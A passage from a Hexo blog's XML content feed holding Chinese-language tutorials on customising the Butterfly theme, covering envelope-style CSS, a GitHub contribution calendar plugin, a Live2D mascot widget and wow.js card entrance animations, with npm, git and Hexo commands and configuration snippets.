class="selector-tag">img</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto <span class="number">0rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#form-wrap</span> &#123;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">447px</span>;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0px</span>;</span><br><span class="line">  <span class="attribute">transition</span>: all <span class="number">1s</span> ease-in-out .<span class="number">3s</span>;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 调整信封划出高度，换信笺内容以后可在此设置height */</span></span><br><span class="line"><span class="selector-id">#form-wrap</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">1050px</span>;</span><br><span class="line">  <span class="attribute">top</span>: -<span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#beforeimg</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">126px</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0px</span>;</span><br><span class="line">  <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">530px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">317px</span>;</span><br><span class="line">  <span class="attribute">z-index</span>: -<span class="number">100</span>;</span><br><span class="line">  <span class="attribute">pointer-events</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#afterimg</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">bottom</span>: -<span class="number">2px</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">530px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">259px</span>;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">100</span>;</span><br><span class="line">  <span class="attribute">pointer-events</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#envelope</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">overflow</span>: visible;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0px</span> auto;</span><br><span class="line">  <span class="attribute">transition</span>: all <span class="number">1s</span> ease-in-out .<span class="number">3s</span>;</span><br><span class="line">  <span class="attribute">padding-top</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#maincontent</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">530px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">20px</span> auto <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.headerimg</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">pointer-events</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.formmain</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: white;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">95%</span>;</span><br><span class="line">  <span class="attribute">max-width</span>: <span class="number">800px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: auto auto;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  -webkit-<span class="attribute">box-shadow</span>: <span class="number">0px</span> <span class="number">0px</span> <span class="number">20px</span> <span class="number">0px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.12</span>);</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0px</span> <span class="number">0px</span> <span class="number">20px</span> <span class="number">0px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.18</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.title3</span> &#123;</span><br><span class="line">  <span class="attribute">text-decoration</span>: none;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">246</span>, <span class="number">214</span>, <span class="number">175</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.comments</span> &#123;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">#ddd</span> <span class="number">1px</span> solid;</span><br><span class="line">  <span class="attribute">border-left</span>: <span class="number">#ddd</span> <span class="number">1px</span> solid;</span><br><span class="line">  <span class="attribute">padding-bottom</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#eee</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">15px</span> <span class="number">0px</span>;</span><br><span class="line">  <span class="attribute">padding-left</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">padding-right</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">border-top</span>: <span class="number">#ddd</span> <span class="number">1px</span> solid;</span><br><span class="line">  <span class="attribute">border-right</span>: <span class="number">#ddd</span> <span class="number">1px</span> solid;</span><br><span class="line">  <span class="attribute">padding-top</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">font-family</span>: <span class="string">&quot;Arial&quot;</span>, <span class="string">&quot;Microsoft YaHei&quot;</span>, <span class="string">&quot;黑体&quot;</span>, <span class="string">&quot;宋体&quot;</span>, sans-serif;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.bottomcontent</span> &#123;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">40px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.bottomimg</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">5px</span> auto <span class="number">5px</span> auto;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">pointer-events</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.bottomhr</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#999</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 夜间模式 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&#x27;dark&#x27;</span>]</span></span><br><span class="line">  <span class="selector-class">.formmain</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgb</span>(<span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&#x27;dark&#x27;</span>]</span></span><br><span class="line">  <span class="selector-class">.comments</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">90</span>, <span class="number">90</span>, <span class="number">90</span>, <span class="number">0.8</span>)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p> <strong>特点：</strong></p><ol><li>纯 CSS3 实现。理论上适用于任何主题。</li><li>可以自定义在页面中自定义头图，并修改 css 中的图片上升高度。</li><li>由于使用了盒子绝对定位。宽度过低时信封会疯狂错位，故写了两个样式。设置为低于一定宽度后自动隐藏信封。</li></ol></li></ol><hr><p class='p center code h4 red'>如有错误，欢迎评论区留言！</p>]]></content>
      
      
      <categories>
          
          <category> Butterfly </category>
          
          <category> 魔改日志文档 </category>
          
          <category> 魔改教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Butterfly </tag>
            
            <tag> 魔改日志文档 </tag>
            
            <tag> 魔改教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>添加GitHub提交日历</title>
      <link href="2021/11/03/%E6%B7%BB%E5%8A%A0GitHub%E6%8F%90%E4%BA%A4%E6%97%A5%E5%8E%86/"/>
      <url>2021/11/03/%E6%B7%BB%E5%8A%A0GitHub%E6%8F%90%E4%BA%A4%E6%97%A5%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<p class='p center logo large'>添加GitHub提交日历</p><p class='p center small'>Butterfly主题魔改教程，添加GitHub提交日历。</p><p><br/></p><div class="tip home"><p>我的博客主题版本为：hexo5.4、Butterfly3.6.2</p><p>如果与我的版本不一样可能会有略微差别，届时请自行百度。</p><p>本文参考文章：<a href="https://zfe.space/post/hexo-githubcalendar.html">小冰博客的《教程：hexo-githubcalendar 插件 1.0》</a>和<a href="https://akilar.top/posts/1f9c68c9/">Akilarの糖果屋的《Gitcalendar》</a>。本博客使用冰老师的<strong><code>hexo-githubcalendar 插件 1.2.2版本</code></strong>。</p></div><h1 id="1-步骤"><a href="#1-步骤" class="headerlink" title="1.步骤"></a>1.步骤</h1><ol><li><p>执行 npm 安装操作：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-githubcalendar --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"></span><br><span class="line">cnpm i hexo-githubcalendar --save</span><br></pre></td></tr></table></figure><p><strong><code>注意，一定要加 --save，不然本地预览的时候可能不会显示！</code></strong></p></li><li><p>新增网站根目录_config 配置项 (不是主题的)：</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Ice Kano Plus_in</span></span><br><span class="line"><span class="comment"># Hexo Github Canlendar</span></span><br><span class="line"><span class="comment"># Author: Ice Kano</span></span><br><span class="line"><span class="comment"># Modify: Lete乐特</span></span><br><span class="line"><span class="comment"># 小冰博客教程</span></span><br><span class="line"><span class="attr">githubcalendar:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">enable_page:</span> <span class="string">/</span></span><br><span class="line">  <span class="attr">user:</span> <span class="string">zfour</span></span><br><span class="line">  <span class="attr">layout:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">id</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">recent-posts</span></span><br><span class="line">    <span class="attr">index:</span> <span class="number">0</span></span><br><span class="line">  <span class="attr">githubcalendar_html:</span> <span class="string">&#x27;&lt;div class=&quot;recent-post-item&quot; style=&quot;width:100%;height:auto;padding:10px;&quot;&gt;&lt;div id=&quot;github_loading&quot; style=&quot;width:10%;height:100%;margin:0 auto;display: block&quot;&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;  viewBox=&quot;0 0 50 50&quot; style=&quot;enable-background:new 0 0 50 50&quot; xml:space=&quot;preserve&quot;&gt;&lt;path fill=&quot;#d0d0d0&quot; d=&quot;M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z&quot; transform=&quot;rotate(275.098 25 25)&quot;&gt;&lt;animateTransform attributeType=&quot;xml&quot; attributeName=&quot;transform&quot; type=&quot;rotate&quot; from=&quot;0 25 25&quot; to=&quot;360 25 25&quot; dur=&quot;0.6s&quot; repeatCount=&quot;indefinite&quot;&gt;&lt;/animateTransform&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/div&gt;&lt;div id=&quot;github_container&quot;&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line">  <span class="attr">pc_minheight:</span> <span class="string">280px</span></span><br><span class="line">  <span class="attr">mobile_minheight:</span> <span class="string">0px</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">&quot;[&#x27;#ebedf0&#x27;, &#x27;#fdcdec&#x27;, &#x27;#fc9bd9&#x27;, &#x27;#fa6ac5&#x27;, &#x27;#f838b2&#x27;, &#x27;#f5089f&#x27;, &#x27;#c4067e&#x27;, &#x27;#92055e&#x27;, &#x27;#540336&#x27;, &#x27;#48022f&#x27;, &#x27;#30021f&#x27;]&quot;</span></span><br><span class="line">  <span class="comment"># color: &quot;[&#x27;#e4dfd7&#x27;, &#x27;#f9f4dc&#x27;, &#x27;#f7e8aa&#x27;, &#x27;#f7e8aa&#x27;, &#x27;#f8df72&#x27;, &#x27;#fcd217&#x27;, &#x27;#fcc515&#x27;, &#x27;#f28e16&#x27;, &#x27;#fb8b05&#x27;, &#x27;#d85916&#x27;, &#x27;#f43e06&#x27;]&quot; #橘黄色调</span></span><br><span class="line">  <span class="comment"># color: &quot;[&#x27;#ebedf0&#x27;, &#x27;#fdcdec&#x27;, &#x27;#fc9bd9&#x27;, &#x27;#fa6ac5&#x27;, &#x27;#f838b2&#x27;, &#x27;#f5089f&#x27;, &#x27;#c4067e&#x27;, &#x27;#92055e&#x27;, &#x27;#540336&#x27;, &#x27;#48022f&#x27;, &#x27;#30021f&#x27;]&quot; #浅紫色调</span></span><br><span class="line">  <span class="comment"># color: &quot;[&#x27;#ebedf0&#x27;, &#x27;#f0fff4&#x27;, &#x27;#dcffe4&#x27;, &#x27;#bef5cb&#x27;, &#x27;#85e89d&#x27;, &#x27;#34d058&#x27;, &#x27;#28a745&#x27;, &#x27;#22863a&#x27;, &#x27;#176f2c&#x27;, &#x27;#165c26&#x27;, &#x27;#144620&#x27;]&quot; #翠绿色调</span></span><br><span class="line">  <span class="comment"># color: &quot;[&#x27;#ebedf0&#x27;, &#x27;#f1f8ff&#x27;, &#x27;#dbedff&#x27;, &#x27;#c8e1ff&#x27;, &#x27;#79b8ff&#x27;, &#x27;#2188ff&#x27;, &#x27;#0366d6&#x27;, &#x27;#005cc5&#x27;, &#x27;#044289&#x27;, &#x27;#032f62&#x27;, &#x27;#05264c&#x27;]&quot; #天青色调</span></span><br><span class="line">  <span class="attr">api:</span> <span class="string">https://python-github-calendar-api.vercel.app/api</span></span><br><span class="line">  <span class="comment"># api: https://python-gitee-calendar-api.vercel.app/api</span></span><br><span class="line">  <span class="attr">calendar_js:</span> <span class="string">https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js</span></span><br><span class="line">  <span class="attr">plus_style:</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>参数释义</p></li></ol><div class="table-container"><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">备选值/类型</th><th style="text-align:center">释义</th></tr></thead><tbody><tr><td style="text-align:center">enable</td><td style="text-align:center">true/false</td><td style="text-align:center">是否开启插件</td></tr><tr><td style="text-align:center">enable_page</td><td style="text-align:center">path/all</td><td style="text-align:center">填写想要应用的页面的相对路径（即路由地址）,如根目录就填’/‘,分类页面就填’/categories/‘。若要应用于所有页面，就填’all’，默认为’/‘</td></tr><tr><td style="text-align:center">user</td><td style="text-align:center">text</td><td style="text-align:center">你的 github 或者 gitee 用户名</td></tr><tr><td style="text-align:center">layout.type</td><td style="text-align:center">id/class</td><td style="text-align:center">挂载容器类型，填写id或class，不填则默认为id</td></tr><tr><td style="text-align:center">layout.name</td><td style="text-align:center">text</td><td style="text-align:center">挂载容器名称</td></tr><tr><td style="text-align:center">layout.index</td><td style="text-align:center">0和正整数</td><td style="text-align:center">前提是layout.type为class，因为同一页面可能有多个class，此项用来确认究竟排在第几个顺位</td></tr><tr><td style="text-align:center">githubcalendar_html</td><td style="text-align:center">html 模板字段</td><td style="text-align:center">包含 loading，和挂载容器</td></tr><tr><td style="text-align:center">pc_minheight</td><td style="text-align:center">280px</td><td style="text-align:center">电脑端插件的最小高度，减少加载带来的视觉偏移</td></tr><tr><td style="text-align:center">mobile_minheight</td><td style="text-align:center">0px</td><td style="text-align:center">手机端插件的最小高度，减少加载带来的视觉偏移</td></tr><tr><td style="text-align:center">color</td><td style="text-align:center">“[‘#ebedf0’, ‘#fdcdec’, ‘#fc9bd9’, ‘#fa6ac5’, ‘#f838b2’, ‘#f5089f’, ‘#c4067e’, ‘#92055e’, ‘#540336’, ‘#48022f’, ‘#30021f’]”</td><td style="text-align:center">calendar 的主题色,一个包含11个色值的数组，文档给出了四款预设值</td></tr><tr><td style="text-align:center">api</td><td style="text-align:center"><a href="https://python-github-calendar-api.vercel.app/api">https://python-github-calendar-api.vercel.app/api</a><br/>或 <a href="https://python-gitee-calendar-api.vercel.app/api">https://python-gitee-calendar-api.vercel.app/api</a></td><td style="text-align:center">这里提供的是公用的 api，仅供日常使用，请不要滥用。如果想搭建自用 api，具体的部署方案可看考 <a href="https://github.com/Zfour/python_github_calendar_api">python_github_calendar_api</a> 及 <a href="https://github.com/Zfour/python_gitee_calendar_api">python_gitee_calendar_api</a> 的文档说明，这里不多加赘述。</td></tr><tr><td style="text-align:center">calendar_js</td><td style="text-align:center"><a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#104;&#116;&#x74;&#x70;&#x73;&#x3a;&#47;&#x2f;&#99;&#x64;&#110;&#46;&#106;&#115;&#x64;&#x65;&#x6c;&#105;&#118;&#114;&#x2e;&#110;&#101;&#116;&#x2f;&#103;&#x68;&#x2f;&#90;&#x66;&#111;&#117;&#x72;&#47;&#104;&#101;&#x78;&#x6f;&#45;&#x67;&#x69;&#116;&#104;&#x75;&#98;&#x2d;&#x63;&#97;&#x6c;&#x65;&#x6e;&#x64;&#97;&#x72;&#x40;&#x31;&#46;&#50;&#x31;&#47;&#104;&#101;&#x78;&#x6f;&#x5f;&#103;&#x69;&#116;&#104;&#117;&#98;&#99;&#x61;&#108;&#x65;&#x6e;&#x64;&#97;&#114;&#x2e;&#x6a;&#x73;">&#104;&#116;&#x74;&#x70;&#x73;&#x3a;&#47;&#x2f;&#99;&#x64;&#110;&#46;&#106;&#115;&#x64;&#x65;&#x6c;&#105;&#118;&#114;&#x2e;&#110;&#101;&#116;&#x2f;&#103;&#x68;&#x2f;&#90;&#x66;&#111;&#117;&#x72;&#47;&#104;&#101;&#x78;&#x6f;&#45;&#x67;&#x69;&#116;&#104;&#x75;&#98;&#x2d;&#x63;&#97;&#x6c;&#x65;&#x6e;&#x64;&#97;&#x72;&#x40;&#x31;&#46;&#50;&#x31;&#47;&#104;&#101;&#x78;&#x6f;&#x5f;&#103;&#x69;&#116;&#104;&#117;&#98;&#99;&#x61;&#108;&#x65;&#x6e;&#x64;&#97;&#114;&#x2e;&#x6a;&#x73;</a></td><td style="text-align:center">jsd 加速的 js，将 github calendar 挂载入容器中</td></tr><tr><td style="text-align:center">plus_style</td><td style="text-align:center">“ ”</td><td style="text-align:center">提供可自定义的 style</td></tr></tbody></table></div><h1 id="2-预览"><a href="#2-预览" class="headerlink" title="2.预览"></a>2.预览</h1><p>执行 hexo 三连，即可发现已经成功部署。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure><h1 id="3-可能出现的Bug及建议"><a href="#3-可能出现的Bug及建议" class="headerlink" title="3.可能出现的Bug及建议"></a>3.可能出现的Bug及建议</h1><p>2021年2月4日，因为github本身的dom变动，导致原有api爬取不到信息，冰老师已经加急修复。请发现日历失效的读者重新<code>fork</code> 上述的<code>python_github_calendar_api</code>项目并采用自建API方案。</p><p>自建API方案请参考：<a href="https://akilar.top/posts/1f9c68c9/">Akilarの糖果屋的《Gitcalendar》</a>教程贴的<code>自建API部署</code>章节。</p><hr><p class='p center code h4 red'>如有错误，欢迎评论区留言！</p>]]></content>
      
      
      <categories>
          
          <category> Butterfly </category>
          
          <category> 魔改日志文档 </category>
          
          <category> 魔改教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Butterfly </tag>
            
            <tag> 魔改日志文档 </tag>
            
            <tag> 魔改教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>添加看板娘</title>
      <link href="2021/11/03/%E6%B7%BB%E5%8A%A0%E7%9C%8B%E6%9D%BF%E5%A8%98/"/>
      <url>2021/11/03/%E6%B7%BB%E5%8A%A0%E7%9C%8B%E6%9D%BF%E5%A8%98/</url>
      
        <content type="html"><![CDATA[<p class='p center logo large'>添加看板娘</p><p class='p center small'>Butterfly主题魔改教程，添加看板娘。</p><p><br/></p><div class="tip home"><p>我的博客主题版本为：hexo5.4、Butterfly3.6.2</p><p>如果与我的版本不一样可能会有略微差别，届时请自行百度。</p><p>本文参考文章：<a href="https://akilar.top/posts/5b8f515f/">Akilarの糖果屋的《Live2d Widget》</a>。</p></div><h1 id="1-说明"><a href="#1-说明" class="headerlink" title="1.说明"></a>1.说明</h1><p>此魔改参考：<a href="https://akilar.top/posts/5b8f515f/#大神魔改看板娘（会说话，能换装）">Akilarの糖果屋的《Live2d Widget》教程贴中的大神魔改看板娘（会说话，能换装）部分。</a>并通过修改<strong><code>waifu.css</code></strong>文件调整了看板娘布局位置。</p><h1 id="2-魔改步骤"><a href="#2-魔改步骤" class="headerlink" title="2.魔改步骤"></a>2.魔改步骤</h1><ol><li><p>以<code>Butterfly</code>主题为例，在<code>[Blogroot]\themes\butterfly\source\</code>目录下打开终端,输入</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/stevenjoezhang/live2d-widget.git live2d-widget</span><br></pre></td></tr></table></figure><p> 这行指令的意思就是<code>clone</code>这个项目到<code>source</code>路径下并重命名为<code>live2d-widget</code>。<del>emm，貌似本来就叫live2d-widget。反正算是一个踩坑点。</del>如果是用下载项目压缩包，解压后放到这里的，也记得把文件夹更名为<code>live2d-widget</code>。</p></li><li><p>找到路径<code>[Blogroot]\themes\butterfly\source\live2d-widget\autoload.js</code>，打开<code>autoload.js</code>，修改内容：</p> <figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">- const live2d_path = &quot;https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/&quot;;</span></span><br><span class="line"><span class="addition">+ const live2d_path = &quot;/live2d-widget/&quot;;</span></span><br></pre></td></tr></table></figure><p> 此处引用一下参考教程原话：<code>autoload.js</code>中的注释的绝对地址指的是，将资源打包放到<code>[Blogroot]/theme/next/source</code>中后，以<code>[Blogroot]/theme/next/source</code>为根目录（/）的绝对路径。</p></li><li><p>在<code>Butterfly</code>的主题配置文件<code>[Blogroot]\_config.butterfly.yml</code>中（<code>butterfly</code>主题其实自带<code>fontawesome</code>依赖，无需引入）修改配置：</p> <figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">    # Inject</span><br><span class="line">    # Insert the code to head (before &#x27;&lt;/head&gt;&#x27; tag) and the bottom (before &#x27;&lt;/body&gt;&#x27; tag)</span><br><span class="line">    # 插入代码到头部 &lt;/head&gt; 之前 和 底部 &lt;/body&gt; 之前</span><br><span class="line">    inject:</span><br><span class="line">      head:</span><br><span class="line">        # - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span><br><span class="line">      bottom:</span><br><span class="line">        # - &lt;script src=&quot;xxxx&quot;&gt;&lt;/script&gt;</span><br><span class="line"><span class="addition">+       - &lt;script defer src=&quot;/live2d-widget/autoload.js&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>保存所有文件的修改，然后照例执行</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure></li><li><p>自定义修改<br> 有一定前端基础的小伙伴可以通过修改<code>[Blogroot]\themes\butterfly\source\live2d-widget</code>路径下的样式资源文件：</p><ul><li><code>waifu-tips.js</code>:包含了按钮和对话框的逻辑</li><li><code>waifu-tips.json</code> :定义了触发条件（selector，CSS 选择器）和触发时显示的文字（text）；</li><li><code>waifu.css</code>:看板娘的样式表。可以对看板娘的位置布局等做自定义修改。</li></ul></li></ol><h1 id="3-Bug归纳"><a href="#3-Bug归纳" class="headerlink" title="3.Bug归纳"></a>3.Bug归纳</h1><ol><li><p><strong>Bug1：</strong>在配置了<code>gulp</code>和<code>pwa</code>之后，看板娘消失。这个是<code>gulp-babel</code>压缩导致的。</p><p> <strong>尝试操作：</strong>一开始博主通过在<code>gulpfile.js</code>里添加屏蔽配置，让<code>gulp</code>不要压缩看板娘的静态资源，但是似乎是因为<code>pwa</code>的缘故，在本地预览重新出现的看板娘在部署到网页以后依然不出现。</p><p> <strong>解决方案：</strong></p><ol><li><p>直接把看板娘提取出来作为单独的项目，然后借助jsdelivr引用相应的静态资源。<code>live2d-widget</code>文件夹不放在博客的<code>source</code>目录中，而是存在独立的<code>github</code>仓库里。这样<code>gulp</code>怎么也压缩不到。而且得益于<code>jsdelivr</code>，看板娘的加载速度也有所提高。</p></li><li><p>配置方法是将<a href="https://github.com/stevenjoezhang/live2d-widget">live2d-widget</a>项目fork到自己的仓库（用原项目也可以，但是那样不方便更改样式啊），然后修改<code>autoload.js</code>里的路径为你自己的仓库名。</p> <figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">- const live2d_path = &quot;https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/&quot;;</span></span><br><span class="line"><span class="addition">+ const live2d_path = &quot;https://cdn.jsdelivr.net/gh/YourGithubName/live2d-widget/&quot;;</span></span><br></pre></td></tr></table></figure></li><li><p>在主题配置项里也可以使用<code>https://cdn.jsdelivr.net/gh/YourGithubName/live2d-widget/autoload.js</code>来引入。</p></li></ol></li></ol><hr><p class='p center code h4 red'>如有错误，欢迎评论区留言！</p>]]></content>
      
      
      <categories>
          
          <category> Butterfly </category>
          
          <category> 魔改日志文档 </category>
          
          <category> 魔改教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Butterfly </tag>
            
            <tag> 魔改日志文档 </tag>
            
            <tag> 魔改教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>首页卡片进入动画</title>
      <link href="2021/10/31/%E9%A6%96%E9%A1%B5%E5%8D%A1%E7%89%87%E8%BF%9B%E5%85%A5%E5%8A%A8%E7%94%BB/"/>
      <url>2021/10/31/%E9%A6%96%E9%A1%B5%E5%8D%A1%E7%89%87%E8%BF%9B%E5%85%A5%E5%8A%A8%E7%94%BB/</url>
      
        <content type="html"><![CDATA[<p class='p center logo large'>首页卡片进入动画</p><p class='p center small'>Butterfly主题魔改教程，实现首页卡片进入动画。</p><p><br/></p><div class="tip home"><p>我的博客主题版本为：hexo5.4、Butterfly3.6.2</p><p>如果与我的版本不一样可能会有略微差别，届时请自行百度。</p><p>本文参考文章：<a href="https://akilar.top/posts/abab51cf/">Akilarの糖果屋的《Add Blog Animation — Wowjs》</a>。</p></div><h1 id="1-参考"><a href="#1-参考" class="headerlink" title="1.参考"></a>1.参考</h1><div class="table-container"><table><thead><tr><th style="text-align:center">参考方向</th><th style="text-align:center">教程原贴</th></tr></thead><tbody><tr><td style="text-align:center">动画样式依赖</td><td style="text-align:center"><a href="https://animate.style/">animate.css</a></td></tr><tr><td style="text-align:center">wowjs 文档</td><td style="text-align:center"><a href="https://github.com/graingert/wow"><img src= "/img/loading.gif" data-lazy-src="https://github-readme-stats.vercel.app/api/pin/?username=graingert&amp;repo=wow&amp;show_owner=true" alt="img"></a></td></tr><tr><td style="text-align:center">魔改教程</td><td style="text-align:center"><a href="https://akilar.top/posts/abab51cf/">Akilarの糖果屋的《Add Blog Animation — Wowjs》</a></td></tr></tbody></table></div><h1 id="2-步骤"><a href="#2-步骤" class="headerlink" title="2.步骤"></a>2.步骤</h1><p>本博客使用糖果屋教程的插件化版本魔改，更多魔改方式请参考：<a href="https://akilar.top/posts/abab51cf/">Akilarの糖果屋的《Add Blog Animation — Wowjs》</a>教程贴。</p><ol><li><p>安装插件，在博客根目录 <strong><code>[Blogroot]</code> </strong>下打开终端，运行以下指令：</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-butterfly-wowjs --save</span><br></pre></td></tr></table></figure></li><li><p>添加配置信息，以下为写法示例<br> 在站点配置文件<strong><code>_config.yml</code></strong> 或者主题配置文件<strong><code>_config.butterfly.yml</code></strong> 中添加:</p> <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">wowjs:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment">#控制动画开关。true是打开，false是关闭</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="number">10</span> <span class="comment">#过滤器优先级</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span> <span class="comment">#移动端是否启用，默认移动端禁用</span></span><br><span class="line">  <span class="attr">animateitem:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">class:</span> <span class="string">recent-post-item</span> <span class="comment">#必填项，需要添加动画的元素的class</span></span><br><span class="line">      <span class="attr">style:</span> <span class="string">animate__zoomIn</span> <span class="comment">#必填项，需要添加的动画</span></span><br><span class="line">      <span class="attr">duration:</span> <span class="string">2s</span> <span class="comment">#选填项，动画持续时间，单位可以是ms也可以是s。例如3s，700ms。</span></span><br><span class="line">      <span class="attr">delay:</span> <span 